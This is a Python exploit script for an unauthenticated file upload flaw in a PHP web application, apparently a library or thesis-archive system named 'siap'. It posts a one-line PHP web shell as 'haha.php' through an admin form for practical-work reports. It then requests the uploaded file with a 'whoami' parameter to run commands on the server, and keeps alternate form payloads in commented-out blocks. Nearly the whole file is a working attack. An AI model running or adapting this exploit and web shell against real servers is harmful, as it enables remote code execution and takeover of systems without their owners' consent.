# No Auth File Upload
import requests

pshell = '<?=`$_GET[1]`?>'

uploadKP_url = 'http://localhost/siap/admin/tambahKP.php' # KP
# uploadTA_url = 'http://localhost/siap/admin/tambahTA.php' # TA
# uploadEBOOK_url = 'http://localhost/siap/admin/tambahEBOOK.php' # EBOOK
shell_url = 'http://localhost/siap/image/koleksi/haha.php?1=whoami'

# form_data_ta = {
#     'judul': (None, 'KP-EvilShell'),
#     'penulis': (None,'Ardias'),
#     'nim': (None,'1337'),
#     'jurusan': (None,'Teknik Sipil'),
#     'dosbimTA': (None, ' RDX'),
#     'dosbimTA1': (None, 'ARDX'),
#     'subjek': (None, 'YesSir'),
#     'barcode': (None, '1337'),
#     'accno': (None, '1337'),
#     'laporan': ('haha.php', pshell, 'application/x-php'),
#     'simpan': (None, 'Tambah')
# }

# form_data_ta = {
#     'judul': (None, 'KP-EvilShell'),
#     'penulis': (None,'Ardias'),
#     'jurusan': (None,'Teknik Sipil'),
#     'subjek': (None, 'YesSir'),
#     'barcode': (None, '1337'),
#     'accno': (None, '1337'),
#     'laporan': ('haha.php', pshell, 'application/x-php'),
#     'simpan': (None, 'Tambah')
# }

form_data_kp = {
    'judul': (None, 'KP-EvilShell'),
    'penulis': (None,'Ardias'),
    'nim': (None,'1337'),
    'jurusan': (None,'Teknik Sipil'),
    'dosbimKP': (None, ' RDX'),
    'dosbimKP1': (None, 'ARDX'),
    'subjek': (None, 'YesSir'),
    'barcode': (None, '1337'),
    'accno': (None, '1337'),
    'laporan': ('haha.php', pshell, 'application/x-php'),
    'simpan': (None, 'Tambah')
}

print('[i] Upload Shell')
r = requests.post(url=uploadKP_url, files=form_data_kp)
if 'Berhasil Ditambahkan !' in r.text:
    print('[+] File Uploaded!')
else:
    print('[-] Failed to upload :(')

print(f'[i] Accessing Shell url in: {shell_url}')
r = requests.get(url=shell_url)
print('Resp:',r.text)
